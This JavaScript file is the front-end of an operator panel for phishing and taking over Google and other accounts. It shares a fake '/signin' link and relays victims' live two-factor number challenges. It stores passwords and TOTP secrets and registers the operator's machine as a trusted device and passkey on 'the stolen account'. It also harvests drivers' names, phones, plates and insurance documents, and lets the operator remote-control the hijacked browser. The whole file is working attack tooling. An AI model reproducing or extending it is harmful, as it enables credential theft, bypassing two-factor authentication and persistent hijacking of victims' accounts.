let TOKEN = localStorage.getItem('gsession_token') || '';

const $ = (id) => document.getElementById(id);

function api(pathname, opts = {}) {
  return fetch('/api' + pathname, {
    ...opts,
    headers: {
      'Content-Type': 'application/json',
      Authorization: 'Bearer ' + TOKEN,
      ...(opts.headers || {}),
    },
  });
}

function toast(msg, kind = '') {
  const t = $('toast');
  t.textContent = msg;
  t.className = 'toast ' + kind;
  setTimeout(() => (t.className = 'toast hidden'), 4200);
}

// ---------- auth gate ----------
async function checkToken(token) {
  const r = await fetch('/api/auth', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token }),
  });
  const d = await r.json();
  return d.ok;
}

async function unlock(token) {
  const ok = await checkToken(token);
  if (!ok) {
    $('gate-error').textContent = 'Invalid token.';
    return;
  }
  TOKEN = token;
  localStorage.setItem('gsession_token', token);
  $('gate').classList.add('hidden');
  $('app').classList.remove('hidden');
  load();
  connectEvents();
}

$('gate-form').addEventListener('submit', (e) => {
  e.preventDefault();
  unlock($('gate-token').value.trim());
});

$('lock-btn').addEventListener('click', () => {
  localStorage.removeItem('gsession_token');
  location.reload();
});

// ---------- sections ----------
const SECTION_TITLES = { sessions: 'Sessions', control: 'Live Control', activity: 'Activity' };
let currentSection = 'sessions';
function showSection(name) {
  currentSection = name;
  for (const id of ['section-sessions', 'section-control', 'section-activity']) {
    document.getElementById(id).classList.toggle('hidden', id !== 'section-' + name);
  }
  for (const btn of document.querySelectorAll('.nav-btn')) {
    btn.classList.toggle('active', btn.dataset.section === name);
  }
  $('topbar-title').textContent = SECTION_TITLES[name] || name;
  // keyboard control only makes sense while the control section is on screen
  if (name !== 'control') $('ctl-stage').blur();
}
document.querySelectorAll('.nav-btn').forEach((btn) =>
  btn.addEventListener('click', () => {
    showSection(btn.dataset.section);
    // entering Live Control with nothing selected: auto-pick an open browser
    if (btn.dataset.section === 'control' && !_ctlId) {
      const s = CACHE.find((x) => x.open);
      if (s) openControl(s.id);
    }
  }),
);

// ---------- activity feed (section replaces the old bell drawer) ----------
let unread = 0;
const noteClass = (type) =>
  type === 'wizard.opened' ? 'opened'
  : type === 'wizard.completed' || type === 'wizard.logged-in' || type === 'wizard.passkey' ? 'completed'
  : 'step';
let feedHasItems = false;
function addNote(evt) {
  const feed = $('feed-main');
  if (!feedHasItems) { feed.innerHTML = ''; feedHasItems = true; }
  const div = document.createElement('div');
  div.className = 'note ' + noteClass(evt.type);
  const time = new Date(evt.ts).toLocaleTimeString();
  div.innerHTML = `<div>${escapeHtml(evt.message || evt.type)}</div><div class="t">${time}</div>`;
  feed.prepend(div);
  if (currentSection !== 'activity') {
    unread += 1;
    const b = $('nav-activity');
    b.textContent = unread;
    b.classList.remove('hidden');
  }
}
function clearUnread() {
  unread = 0;
  $('nav-activity').classList.add('hidden');
}
// visiting activity clears the badge
const origShow = showSection;
showSection = function (name) {
  origShow(name);
  if (name === 'activity') clearUnread();
};

// ---------- render sessions ----------
function statusBadge(s) {
  const labels = { 'logged-in': 'logged in', trusted: 'keypass ✓', pending: 'needs 2FA', error: 'error', new: 'new' };
  return `<span class="badge ${s.status}">${labels[s.status] || s.status}</span>`;
}

let FILTER = 'all';
function matchFilter(s) {
  if (FILTER === 'all') return true;
  if (FILTER === 'logged-in') return s.status === 'logged-in' || s.status === 'trusted';
  return s.status === FILTER;
}

function card(s) {
  const chips = [];
  chips.push(`<span class="chip">${s.provider}</span>`);
  if (s.hasPassword) chips.push('<span class="chip">password ✓</span>');
  if (s.hasTotp) chips.push('<span class="chip">2FA ✓</span>');
  if (s.deviceTrusted) chips.push('<span class="chip trusted">🔑 device ✓</span>');
  if (s.passkeyAdded) chips.push('<span class="chip trusted">🔏 passkey ✓</span>');
  const driver = [];
  if (s.contactName) driver.push(`<span class="chip driver">👤 ${escapeHtml(s.contactName)}</span>`);
  if (s.phone) driver.push(`<span class="chip driver">📞 ${escapeHtml(s.phone)}</span>`);
  if (s.truckPlate) driver.push(`<span class="chip driver">🚚 <b>${escapeHtml(s.truckPlate)}</b></span>`);
  if (s.trailerPlate) driver.push(`<span class="chip driver">🛻 ${escapeHtml(s.trailerPlate)}</span>`);
  if (s.driverName) driver.push(`<span class="chip driver">🪪 ${escapeHtml(s.driverName)}</span>`);
  if (s.driverPhone) driver.push(`<span class="chip driver">📱 ${escapeHtml(s.driverPhone)}</span>`);
  if (s.licensePlate) driver.push(`<span class="chip driver">🚚 <b>${escapeHtml(s.licensePlate)}</b></span>`);
  if (s.license) driver.push(`<span class="chip driver">🪪 ${escapeHtml(s.license)}</span>`);
  if (s.vehicle) driver.push(`<span class="chip driver">🚗 ${escapeHtml(s.vehicle)}</span>`);
  if (s.city) driver.push(`<span class="chip driver">📍 ${escapeHtml(s.city)}</span>`);
  if (s.docs) {
    for (const [kind, file] of Object.entries(s.docs)) {
      if (!file) continue;
      const icon = kind === 'insurance' ? '📄' : '🏢';
      chips.push(`<a class="chip doc" target="_blank" href="/api/sessions/${s.id}/docs/${encodeURIComponent(file)}?token=${encodeURIComponent(TOKEN)}">${icon} ${escapeHtml(file)}</a>`);
    }
  }
  return `
  <div class="card" data-id="${s.id}">
    <div class="card-head">
      <div>
        <h3>${escapeHtml(s.name)}</h3>
        <div class="sub">${escapeHtml(s.username || '—')}</div>
      </div>
      <div style="display:flex;gap:6px;flex-direction:column;align-items:flex-end">
        ${statusBadge(s)}
        ${s.open ? '<span class="badge open">browser open</span>' : ''}
      </div>
    </div>
    <div class="chips">${driver.length ? driver.join('') : ''}${chips.join('')}</div>
    ${s.note ? `<div class="sub">${escapeHtml(s.note)}</div>` : ''}
    <div class="card-actions">
      <button class="primary" onclick="doLogin('${s.id}')">Auto-login</button>
      <button onclick="doOpen('${s.id}')">Open</button>
      ${s.open ? `<button class="primary" onclick="openControl('${s.id}')">📺 Control</button>` : ''}
      <button title="Register this OS as the account's trusted device (keypass)" onclick="doTrust('${s.id}')">🔑 Device</button>
      <button title="Add this Chrome as a passkey for the account (future sign-ins skip the password)" onclick="doPasskey('${s.id}')">🔏 Passkey</button>
      <button title="Sign this Chrome back into the stolen account using the stored passkey (our device)" onclick="doPasskeyLogin('${s.id}')">🔓 Sign passkey</button>
      ${s.open ? `<button onclick="doClose('${s.id}')">Close</button>` : ''}
      <button onclick="editSession('${s.id}')">Edit</button>
      <button class="danger" onclick="doDelete('${s.id}')">Delete</button>
    </div>
  </div>`;
}

let CACHE = [];
async function load() {
  const r = await api('/sessions');
  if (r.status === 401) return $('lock-btn').click();
  CACHE = await r.json();
  const nc = $('nav-count');
  nc.textContent = CACHE.length;
  nc.classList.toggle('hidden', CACHE.length === 0);
  const visible = CACHE.filter(matchFilter);
  const grid = $('grid');
  $('empty').classList.toggle('hidden', CACHE.length > 0);
  grid.innerHTML = visible.map(card).join('');
  refreshCtlSelect();
}

document.querySelectorAll('#filters .filter').forEach((btn) =>
  btn.addEventListener('click', () => {
    FILTER = btn.dataset.filter;
    document.querySelectorAll('#filters .filter').forEach((b) => b.classList.toggle('active', b === btn));
    load();
  }),
);

// ---------- single static link ----------
function shareLink() {
  return location.origin + '/signin';
}
function copyText(text) {
  navigator.clipboard.writeText(text).then(() => toast('Link copied.', 'ok'));
}
(function setShareLink() {
  const el = $('share-link');
  if (el) el.value = shareLink();
})();

// ---------- live notifications (SSE) ----------
let sse = null;
function connectEvents() {
  if (sse) sse.close();
  sse = new EventSource('/api/events?token=' + encodeURIComponent(TOKEN));
  sse.onmessage = (e) => {
    let evt;
    try { evt = JSON.parse(e.data); } catch { return; }
    addNote(evt);
    if (evt.type && evt.type.startsWith('wizard')) load();
    // a live challenge appears while the user signs in from their side: pop the
    // modal with the number so it's visible without doing anything from the panel.
    if (evt.type === 'wizard.challenge' && evt.sessionId && !document.querySelector('#watch-modal:not(.hidden)')) {
      openPending(evt.sessionId, { options: evt.options, message: evt.loginMessage || evt.message });
    }
  };
  sse.onerror = () => { /* browser auto-reconnects */ };
}

// ---------- actions ----------
async function doOpen(id) {
  toast('Launching browser…');
  const r = await api(`/sessions/${id}/open`, { method: 'POST' });
  const d = await r.json();
  if (d.ok) {
    toast(d.message || 'Browser opened.', d.status === 'error' ? 'err' : 'ok');
    load();
    if (d.open) {
      openControl(id); // show the window right away
      maybeWatchPending(id, d);
    }
  } else toast(d.error || 'Failed to open', 'err');
}

async function doLogin(id) {
  toast('Opening browser and signing in…');
  const r = await api(`/sessions/${id}/login`, { method: 'POST' });
  const d = await r.json();
  if (d.ok) {
    toast(d.message || 'Done', d.status === 'error' ? 'err' : 'ok');
    load();
    maybeWatchPending(id, d);
  } else toast(d.error || 'Login failed', 'err');
}

// ---------- pending-challenge tracking (number / code / phone-approve) ----------
const PENDING_STATES = ['numchoice', 'code', 'approve', 'choice', 'sms', 'passkey', 'trust-start', 'password'];
function stateOf(d) {
  return d.trustState || d.state;
}
function maybeWatchPending(id, d) {
  if (d.open && PENDING_STATES.includes(stateOf(d))) {
    openPending(id, { options: d.options, message: d.trustMessage || d.message });
  } else if (d.open && stateOf(d) === 'trusted') {
    toast('Device registered — this OS is the keypass for the account now.', 'ok');
  }
}
let _pendingTimer = null;
async function openPending(id, first) {
  stopPending();
  openWatchShell('Sign-in progress');
  watchMsg().textContent = (first && first.message) || 'Waiting for Google to finish checking…';
  watchMsg().classList.remove('hidden');
  renderPending(first || {});
  await pollPendingState(id);
  _pendingTimer = setInterval(() => pollPendingState(id), 3500);
}
function stopPending() {
  if (_pendingTimer) { clearInterval(_pendingTimer); _pendingTimer = null; }
}
async function pollPendingState(id) {
  try {
    const r = await api(`/sessions/${id}/state`);
    const d = await r.json();
    if (!d.open) {
      stopPending();
      closeWatch();
      load();
      return;
    }
    renderPending(d);
    if (d.state === 'trusted') {
      stopPending();
      toast('Device registered ✓ This OS is the keypass for the account now.', 'ok');
      watchMsg().textContent = 'Device registered ✓ Future sign-ins on this OS skip the phone-tap / 2FA for this account.';
      watchMsg().classList.remove('hidden');
      setTimeout(() => { closeWatch(); load(); }, 2500);
    } else if (d.status === 'logged-in' || d.state === 'signed-in') {
      stopPending();
      toast('Signed in ✓ Session saved.', 'ok');
      watchMsg().textContent = 'Signed in ✓ Session saved — browser stays open.';
      watchMsg().classList.remove('hidden');
      setTimeout(() => { closeWatch(); load(); }, 2000);
    } else if (d.status === 'error') {
      stopPending();
      watchMsg().textContent = d.message || 'Sign-in hit an error.';
      watchMsg().classList.remove('hidden');
      load();
    }
  } catch {}
}
function renderPending(d) {
  const opts = (d.options && d.options.length) ? d.options : null;
  if (opts && opts.join('|') !== (watchNumbers().dataset.opts || '')) {
    watchNumbers().dataset.opts = opts.join('|');
    const allNums = opts.every((o) => /^\+?\d[\d\s\-().]{0,17}$/.test(String(o)));
    const label = opts.length === 1
      ? (allNums ? 'Verification number on Google’s page' : 'Option Google is showing')
      : (allNums ? 'Pick the number Google is showing' : 'Options Google is showing');
    watchNumbers().innerHTML =
      `<div class="watch-num-label">${label}</div>` +
      opts.map((n) => `<div class="watch-number">${escapeHtml(n)}</div>`).join('');
  }
  watchNumbers().classList.toggle('hidden', !opts);
  if (d.message) {
    watchMsg().classList.remove('hidden');
    watchMsg().textContent = d.message;
  }
}

async function doTrust(id) {
  toast('Registering this OS as the trusted device…');
  const r = await api(`/sessions/${id}/trust`, { method: 'POST' });
  const d = await r.json();
  if (!d.ok) { toast(d.error || 'Device registration failed', 'err'); load(); return; }
  toast(d.message || 'Device registration started.', d.state === 'trusted' ? 'ok' : '');
  maybeWatchPending(id, d);
  load();
}

async function doPasskey(id) {
  toast('Adding this Chrome as a passkey for the account…');
  const r = await api(`/sessions/${id}/passkey`, { method: 'POST' });
  const d = await r.json();
  if (!d.ok) { toast(d.error || 'Passkey registration failed', 'err'); load(); return; }
  toast(d.message || 'Passkey registration started.', d.passkey ? 'ok' : '');
  load();
}

async function doPasskeyLogin(id) {
  toast('Signing in with the stored passkey (our device)…');
  const r = await api(`/sessions/${id}/passkey-signin`, { method: 'POST' });
  const d = await r.json();
  if (!d.ok) { toast(d.error || 'Passkey sign-in failed', 'err'); load(); return; }
  toast(d.message || 'Passkey sign-in started.', d.status === 'logged-in' ? 'ok' : '');
  if (d.open) openControl(id);
  maybeWatchPending(id, d);
  load();
}

async function doClose(id) {
  await api(`/sessions/${id}/close`, { method: 'POST' });
  if (_ctlId === id) closeControl();
  toast('Browser closed.', 'ok');
  load();
}

async function doDelete(id) {
  if (!confirm('Delete this session and its stored browser data?')) return;
  await api(`/sessions/${id}`, { method: 'DELETE' });
  if (_ctlId === id) closeControl();
  toast('Session deleted.');
  load();
}

// ---------- modal (new/edit session) ----------
function openModal() {
  $('modal-title').textContent = 'New session';
  $('session-form').reset();
  $('f-id').value = '';
  $('form-error').textContent = '';
  toggleUrlRow();
  $('modal').classList.remove('hidden');
  $('f-name').focus();
}
function closeModal() {
  $('modal').classList.add('hidden');
}
function editSession(id) {
  const s = CACHE.find((x) => x.id === id);
  if (!s) return;
  $('modal-title').textContent = 'Edit session';
  $('f-id').value = s.id;
  $('f-name').value = s.name;
  $('f-provider').value = s.provider;
  $('f-url').value = s.loginUrl || '';
  $('f-username').value = s.username || '';
  $('f-password').value = '';
  $('f-totp').value = '';
  $('f-note').value = s.note || '';
  $('form-error').textContent = '';
  toggleUrlRow();
  $('modal').classList.remove('hidden');
}

function toggleUrlRow() {
  $('url-row').classList.toggle('hidden', $('f-provider').value === 'google');
}
$('f-provider').addEventListener('change', toggleUrlRow);
$('new-btn').addEventListener('click', openModal);

$('session-form').addEventListener('submit', async (e) => {
  e.preventDefault();
  const id = $('f-id').value;
  const payload = {
    name: $('f-name').value,
    provider: $('f-provider').value,
    loginUrl: $('f-url').value,
    username: $('f-username').value,
    note: $('f-note').value,
  };
  const pw = $('f-password').value;
  const totp = $('f-totp').value;
  if (pw) payload.password = pw;
  if (id) {
    payload.totpSecret = totp; // editable; empty clears
    const r = await api(`/sessions/${id}`, { method: 'PATCH', body: JSON.stringify(payload) });
    if (!r.ok) return ($('form-error').textContent = 'Save failed.');
  } else {
    if (totp) payload.totpSecret = totp;
    const r = await api('/sessions', { method: 'POST', body: JSON.stringify(payload) });
    if (!r.ok) return ($('form-error').textContent = 'Create failed.');
  }
  closeModal();
  toast('Saved.', 'ok');
  load();
});

function escapeHtml(str) {
  return String(str).replace(/[&<>"']/g, (c) =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])
  );
}

// ---------- watch modal (pending challenge only — stream lives in Live Control) ----------
const watchMsg = () => $('watch-msg');
const watchNumbers = () => $('watch-numbers');
function openWatchShell(title, message) {
  $('watch-title').textContent = title;
  $('watch-modal').classList.remove('hidden');
  if (message !== undefined) {
    watchMsg().textContent = message;
    watchMsg().classList.remove('hidden');
  } else {
    watchMsg().classList.add('hidden');
  }
}
function closeWatch() {
  stopPending();
  $('watch-modal').classList.add('hidden');
  load();
}

// ============================================================================
// LIVE CONTROL — stream + remote mouse/keyboard with exact scaling
// ============================================================================
let _ctlId = null;
let _ctlMode = 'desktop';           // desktop = full VNC/TeamViewer-style view
let _ctlStream = null;
let _ctlViewing = false;           // stream is delivering frames
let streamViewport = { width: 1440, height: 900 }; // from the stream "start" event
let _downButtons = 0;
let _lastMove = 0;

function ctlMouseOn() { return $('ctl-mouse').checked; }
function ctlKeyOn() { return $('ctl-key').checked; }

function vncSrc() {
  return '/vnc/vnc.html?autoconnect=true&resize=scale&reconnect=true&cursor=auto&token=' + encodeURIComponent(TOKEN);
}
function startVnc() {
  const frame = $('ctl-vnc');
  const empty = $('ctl-desktop-empty');
  if (!frame) return;
  empty.classList.add('hidden');
  frame.classList.remove('hidden');
  if (!frame.src || !frame.src.includes('/vnc/')) frame.src = vncSrc();
  $('ctl-live').classList.remove('hidden');
}
function stopVnc() {
  const frame = $('ctl-vnc');
  if (!frame) return;
  frame.classList.add('hidden');
  frame.src = 'about:blank';
  const empty = $('ctl-desktop-empty');
  if (empty) empty.classList.remove('hidden');
}
function setCtlMode(mode) {
  _ctlMode = mode;
  const section = $('section-control');
  section.classList.toggle('mode-desktop', mode === 'desktop');
  section.classList.toggle('mode-page', mode === 'page');
  $('ctl-mode-desktop').classList.toggle('active', mode === 'desktop');
  $('ctl-mode-page').classList.toggle('active', mode === 'page');
  if (mode === 'desktop') {
    startVnc();
    closeCtlStream();
    if (_ctlId) focusSession(_ctlId);
  } else {
    stopVnc();
    $('ctl-live').classList.add('hidden');
    if (_ctlId) startCtlStream(_ctlId);
  }
}
function focusSession(id, attempt = 0) {
  if (!id) return;
  api(`/sessions/${id}/focus`, { method: 'POST' })
    .then((r) => r.json())
    .then((d) => {
      if (!d.ok && attempt < 5) setTimeout(() => focusSession(id, attempt + 1), 700);
      else if (!d.ok) toast('Focus: ' + (d.error || 'failed'), 'err');
    })
    .catch(() => {});
}

function refreshCtlSelect() {
  const sel = $('ctl-select');
  if (!sel) return;
  const cur = sel.value;
  sel.innerHTML = CACHE
    .map((s) => `<option value="${s.id}">${escapeHtml(s.name)} · ${escapeHtml(s.username || 'no user')}${s.open ? ' (open)' : ''}</option>`)
    .join('');
  if (CACHE.some((s) => s.id === cur)) sel.value = cur;
}

function openControl(id) {
  showSection('control');
  _ctlId = id;
  refreshCtlSelect();
  const sel = $('ctl-select');
  if (sel) sel.value = id;
  if (_ctlMode === 'desktop') {
    startVnc();
    focusSession(id);
  } else {
    startCtlStream(id);
  }
  startCtlPoll();
  // keyboard needs focus on the stage in page mode
  if (_ctlMode === 'page' && ctlKeyOn()) $('ctl-stage').focus();
}

function startCtlStream(id) {
  closeCtlStream();
  $('ctl-empty').classList.remove('hidden');
  $('ctl-frame').classList.add('hidden');
  const es = new EventSource('/api/sessions/' + id + '/stream?token=' + encodeURIComponent(TOKEN));
  es.onmessage = (e) => {
    let d;
    try { d = JSON.parse(e.data); } catch { return; }
    if (d.type === 'start') {
      if (d.viewport) streamViewport = d.viewport;
      _ctlViewing = true;
      $('ctl-frame').classList.remove('hidden');
      $('ctl-empty').classList.add('hidden');
      $('ctl-live').classList.remove('hidden');
    } else if (d.type === 'frame') {
      $('ctl-frame').src = 'data:image/jpeg;base64,' + d.frame;
    } else if (d.type === 'error') {
      toast('Stream: ' + d.message, 'err');
    }
  };
  es.onerror = () => {
    // 404 / server gone: browser probably closed
    if (!_ctlViewing) {
      $('ctl-empty').innerHTML = '<p>Browser is not open for this session.</p><p class="muted">Use <b>Open</b> on the session card first.</p>';
    }
  };
  _ctlStream = es;
}

function closeCtlStream() {
  if (_ctlStream) { _ctlStream.close(); _ctlStream = null; }
  _ctlViewing = false;
  $('ctl-live').classList.add('hidden');
  $('ctl-cursor').classList.add('hidden');
}

// ---- tabs (normal-browser navigation: switch / open / close / address bar) ----
let _ctlPoll = null;
let _ctlTabs = { open: false, tabs: [], index: -1 };
const trunc = (s, n) => (s.length > n ? s.slice(0, n - 1) + '…' : s);

async function pollTabs() {
  if (!_ctlId) return;
  try {
    const r = await api(`/sessions/${_ctlId}/tabs`);
    if (!r.ok) return;
    _ctlTabs = await r.json();
    renderCtlTabs();
    updateCtlUrl();
  } catch { /* server gone */ }
}
function startCtlPoll() {
  stopCtlPoll();
  pollTabs();
  _ctlPoll = setInterval(pollTabs, 2000);
}
function stopCtlPoll() {
  if (_ctlPoll) { clearInterval(_ctlPoll); _ctlPoll = null; }
}
function renderCtlTabs() {
  const wrap = $('ctl-tabs');
  if (!wrap) return;
  wrap.innerHTML = _ctlTabs.tabs.map((t) => {
    const label = t.title || (t.url && t.url !== 'about:blank' ? t.url : 'New Tab');
    return `<div class="tab-chip${t.i === _ctlTabs.index ? ' active' : ''}" data-i="${t.i}" title="${escapeHtml(t.url)}">
      <span class="tab-label">${escapeHtml(trunc(label, 30))}</span>
      <span class="tab-x" data-x="${t.i}" title="Close tab">×</span>
    </div>`;
  }).join('');
}
function updateCtlUrl() {
  const el = $('ctl-url');
  if (!el || document.activeElement === el) return;
  const t = _ctlTabs.tabs[_ctlTabs.index];
  el.value = t && t.url && t.url !== 'about:blank' ? t.url : '';
}
async function ctlActivateTab(i) {
  if (!_ctlId || i === _ctlTabs.index) return;
  await api(`/sessions/${_ctlId}/tabs/${i}/activate`, { method: 'POST' });
  startCtlStream(_ctlId); // stream follows the newly active tab
  pollTabs();
}
async function ctlCloseTab(i) {
  if (!_ctlId) return;
  const wasActive = i === _ctlTabs.index;
  await api(`/sessions/${_ctlId}/tabs/${i}`, { method: 'DELETE' });
  if (wasActive) startCtlStream(_ctlId); // follow whatever tab is active now
  pollTabs();
}
async function ctlNav(action) {
  if (!_ctlId) return;
  await api(`/sessions/${_ctlId}/nav`, { method: 'POST', body: JSON.stringify({ action }) });
  pollTabs();
}

function closeControl() {
  closeCtlStream();
  stopCtlPoll();
  _ctlId = null;
  const sel = $('ctl-select');
  if (sel) sel.value = '';
  $('ctl-frame').classList.add('hidden');
  $('ctl-empty').innerHTML = '<p>Pick a session with an open browser and hit <b>📺 Control</b>.</p><p class="muted">You\'ll see the real Chrome window and can drive it with your mouse and keyboard. Everything scales 1:1 — clicks land where you point.</p>';
  $('ctl-empty').classList.remove('hidden');
  showSection('sessions');
}

$('ctl-select').addEventListener('change', (e) => { if (e.target.value) openControl(e.target.value); });
$('ctl-close').addEventListener('click', closeControl);

// tab strip: click a tab to switch, click × to close it
$('ctl-tabs').addEventListener('click', (e) => {
  const chip = e.target.closest('.tab-chip');
  if (!chip) return;
  const i = Number(chip.dataset.i);
  if (e.target.closest('.tab-x')) ctlCloseTab(i);
  else ctlActivateTab(i);
});
$('ctl-newtab').addEventListener('click', async () => {
  if (!_ctlId) return;
  await api(`/sessions/${_ctlId}/tabs`, { method: 'POST', body: JSON.stringify({ url: '' }) });
  startCtlStream(_ctlId); // new tab is now the active one
  pollTabs();
});
// address bar
$('ctl-url').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    e.preventDefault();
    const url = e.target.value.trim();
    if (!url || !_ctlId) return;
    e.target.value = '';
    api(`/sessions/${_ctlId}/navigate`, { method: 'POST', body: JSON.stringify({ url }) }).then(pollTabs);
  } else if (e.key === 'Escape') {
    e.target.blur();
  }
});
$('ctl-back').addEventListener('click', () => ctlNav('back'));
$('ctl-fwd').addEventListener('click', () => ctlNav('forward'));
$('ctl-reload').addEventListener('click', () => ctlNav('reload'));
$('ctl-fs').addEventListener('click', () => {
  const st = $('ctl-stage');
  if (document.fullscreenElement) document.exitFullscreen().catch(() => {});
  else st.requestFullscreen().catch(() => {});
});
$('ctl-key').addEventListener('change', (e) => {
  if (e.target.checked && _ctlId) $('ctl-stage').focus();
});

// ---- coordinate mapping: stream pixels (letterboxed "contain") -> page CSS px ----
function stageBox() {
  const img = $('ctl-frame');
  const r = img.getBoundingClientRect();
  if (!r.width || !r.height) return null;
  const vw = streamViewport.width, vh = streamViewport.height;
  const scale = Math.min(r.width / vw, r.height / vh);
  const cw = vw * scale, ch = vh * scale;
  return {
    scale,
    ox: r.left + (r.width - cw) / 2,
    oy: r.top + (r.height - ch) / 2,
    cw, ch,
  };
}
function pageCoords(e) {
  const b = stageBox();
  if (!b) return null;
  const inside = e.clientX >= b.ox && e.clientX <= b.ox + b.cw && e.clientY >= b.oy && e.clientY <= b.oy + b.ch;
  return {
    inside,
    x: Math.max(0, Math.min(streamViewport.width, (e.clientX - b.ox) / b.scale)),
    y: Math.max(0, Math.min(streamViewport.height, (e.clientY - b.oy) / b.scale)),
  };
}
function mod(e) {
  let m = 0;
  if (e.altKey) m |= 1;
  if (e.ctrlKey) m |= 2;
  if (e.metaKey) m |= 4;
  if (e.shiftKey) m |= 8;
  return m;
}
function sendCtl(ev) {
  if (!_ctlId) return;
  fetch('/api/sessions/' + _ctlId + '/input', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: 'Bearer ' + TOKEN },
    body: JSON.stringify(ev),
  }).catch(() => {});
}

// ---- virtual mouse cursor overlay (where the remote cursor will land) ----
function showCtlCursor(e, p) {
  const b = stageBox();
  if (!b) return;
  const st = $('ctl-stage').getBoundingClientRect();
  const cur = $('ctl-cursor');
  cur.style.left = (b.ox + p.x * b.scale - st.left) + 'px';
  cur.style.top = (b.oy + p.y * b.scale - st.top) + 'px';
  cur.classList.remove('hidden');
}
function hideCtlCursor() {
  $('ctl-cursor').classList.add('hidden');
}

// ---- mouse forwarding ----
const stage = $('ctl-stage');
stage.addEventListener('mousemove', (e) => {
  if (!_ctlId || !_ctlViewing) { hideCtlCursor(); return; }
  const p = pageCoords(e);
  if (!p || !p.inside) { hideCtlCursor(); return; }
  showCtlCursor(e, p);
  if (!ctlMouseOn()) return;
  const now = Date.now();
  // always forward while a button is held (drag); otherwise ~25/s
  if (now - _lastMove >= 40 || _downButtons) {
    _lastMove = now;
    sendCtl({ type: 'move', x: p.x, y: p.y, buttons: _downButtons, modifiers: mod(e) });
  }
});
stage.addEventListener('mousedown', (e) => {
  if (!_ctlId || !_ctlViewing || !ctlMouseOn()) return;
  const p = pageCoords(e);
  if (!p || !p.inside) return;
  e.preventDefault();
  const button = e.button === 2 ? 'right' : e.button === 1 ? 'middle' : 'left';
  _downButtons = e.button === 0 ? 1 : e.button === 2 ? 2 : 4;
  sendCtl({ type: 'down', x: p.x, y: p.y, button, buttons: _downButtons, clickCount: e.detail || 1, modifiers: mod(e) });
});
stage.addEventListener('mouseup', (e) => {
  if (!_ctlId || !_ctlViewing || !ctlMouseOn()) return;
  const p = pageCoords(e);
  if (!p || !p.inside) { _downButtons = 0; return; }
  e.preventDefault();
  const button = e.button === 2 ? 'right' : e.button === 1 ? 'middle' : 'left';
  sendCtl({ type: 'up', x: p.x, y: p.y, button, buttons: 0, clickCount: e.detail || 1, modifiers: mod(e) });
  _downButtons = 0;
});
stage.addEventListener('mouseleave', () => { hideCtlCursor(); _downButtons = 0; });
stage.addEventListener('wheel', (e) => {
  if (!_ctlId || !_ctlViewing || !ctlMouseOn()) return;
  const p = pageCoords(e);
  if (!p || !p.inside) return;
  e.preventDefault();
  let dx = e.deltaX, dy = e.deltaY;
  if (e.shiftKey) { dx = e.deltaY; dy = 0; } // shift+scroll = horizontal
  sendCtl({ type: 'wheel', x: p.x, y: p.y, deltaX: dx, deltaY: dy, modifiers: mod(e) });
}, { passive: false });
stage.addEventListener('contextmenu', (e) => {
  if (_ctlId && _ctlViewing && ctlMouseOn()) e.preventDefault();
});

// ---- keyboard forwarding ----
stage.addEventListener('keydown', (e) => {
  if (!_ctlId || !_ctlViewing || !ctlKeyOn()) return;
  // let the browser exit fullscreen on Esc instead of forwarding it
  if (document.fullscreenElement && e.key === 'Escape') return;
  e.preventDefault();
  if (e.key && e.key.length === 1) sendCtl({ type: 'key', kind: 'down', text: e.key, key: e.key, code: e.code });
  else sendCtl({ type: 'key', kind: 'down', key: e.key, code: e.code });
});
stage.addEventListener('keyup', (e) => {
  if (!_ctlId || !_ctlViewing || !ctlKeyOn()) return;
  e.preventDefault();
  sendCtl({ type: 'key', kind: 'up', key: e.key, code: e.code });
});

// expose for inline handlers
window.openModal = openModal;
window.closeModal = closeModal;
window.editSession = editSession;
window.doOpen = doOpen;
window.doLogin = doLogin;
window.doClose = doClose;
window.doDelete = doDelete;
window.doTrust = doTrust;
window.doPasskey = doPasskey;
window.doPasskeyLogin = doPasskeyLogin;
window.openControl = openControl;
window.copyText = copyText;
window.shareLink = shareLink;

// ---------- boot ----------
(async function boot() {
  if (TOKEN && (await checkToken(TOKEN))) {
    $('gate').classList.add('hidden');
    $('app').classList.remove('hidden');
    load();
    connectEvents();
  }
})();
